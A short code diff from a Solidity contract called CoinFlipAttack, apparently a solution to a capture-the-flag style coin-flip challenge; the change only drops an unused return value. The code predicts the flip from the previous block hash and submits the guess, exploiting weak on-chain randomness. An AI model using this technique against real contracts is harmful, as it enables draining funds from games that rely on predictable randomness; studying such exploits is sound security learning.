@@ -18,7 +18,7 @@ contract CoinFlipAttack is Broadcasted {
         uint256 _blockValue = uint256(blockhash(block.number - 1));
 
         uint256 _coinFlip = _blockValue / FACTOR;
-        bool _guessed = ICoinFlip(coinFlipCtr_).flip(_coinFlip == 1);
+        ICoinFlip(coinFlipCtr_).flip(_coinFlip == 1);
     }
 }
 
